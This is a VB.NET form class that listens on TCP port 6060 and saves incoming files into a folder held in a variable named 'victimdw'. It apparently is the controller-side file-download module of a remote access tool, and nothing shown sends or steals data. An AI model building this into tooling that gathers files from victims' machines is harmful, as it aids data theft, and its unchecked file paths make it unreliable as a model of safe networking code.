﻿Imports System.Net.Sockets
Imports System.IO
Imports System.Net
Public Class dw
    Private Listen As Threading.Thread
    Public p As Integer = 6060
    Dim buffersize As Integer = 1024 * 20
    Public victimdw As String = ""
    Private fname As String
    Dim tcplist As New TcpListener(IPAddress.Any, p)
    Sub Listener()
        tcplist.Start()
        Do
            If tcplist.Pending Then tcplist.BeginAcceptTcpClient(AddressOf RCV, tcplist)
            Threading.Thread.Sleep(1000)
        Loop
        tcplist.Stop()
    End Sub
    Sub RCV(ByVal ar As IAsyncResult)
        Try
            Dim listener As TcpListener = CType(ar.AsyncState, TcpListener)
            Dim clientSocket As TcpClient = listener.EndAcceptTcpClient(ar)
            Dim filename, filepath As String, filelen As Long
            Dim br As New BinaryReader(clientSocket.GetStream)
            filename = br.ReadString
            filelen = br.ReadInt64
            filepath = Path.Combine(victimdw, filename)
            UpdateStatusLabel("Receiving : " & filename)
            Dim buffer(buffersize) As Byte
            Dim readstotal As Long = 0
            Dim reads As Integer = -1
            Using fs As New FileStream(filepath, FileMode.Create, FileAccess.Write)
                Do Until readstotal = filelen
                    reads = clientSocket.GetStream.Read(buffer, 0, buffer.Length)
                    fs.Write(buffer, 0, reads)
                    readstotal += reads
                Loop
            End Using
            Dim size As New FileInfo(filepath)
            UpdateStatusLabel("File Received : " & filename)
            UpdateStatusLabel("File size : " & Form1.GetSize(size.Length))

            br.Close()
            clientSocket.Close()


        Catch ex As Exception
            tcplist.Stop()
        End Try

    End Sub
    Private Sub Form1_FormClosed(sender As Object, e As Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        tcplist.Stop()
        Listen.Abort()
    End Sub
    Private Delegate Sub UpdateStatusLabelDelegate(ByVal status As String)
    Private Sub UpdateStatusLabel(ByVal status As String)
        Try
            BeginInvoke(New UpdateStatusLabelDelegate(AddressOf UpdateStatusLabelSub), status)
        Catch ex As Exception
            Lv1.Items.Add(status)
        End Try
    End Sub
    Private Sub UpdateStatusLabelSub(ByVal status As String)
        Try
            Lv1.Items.Add(status)
        Catch ex As Exception

        End Try
    End Sub
    Private Sub dw_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        tcplist.Stop()
        Listen.Abort()
    End Sub
    Private Sub frmClient_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Listen = New Threading.Thread(AddressOf Listener)
        Listen.Start()
    End Sub
    Private Sub Lv1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Lv1.SelectedIndexChanged

    End Sub
End Class
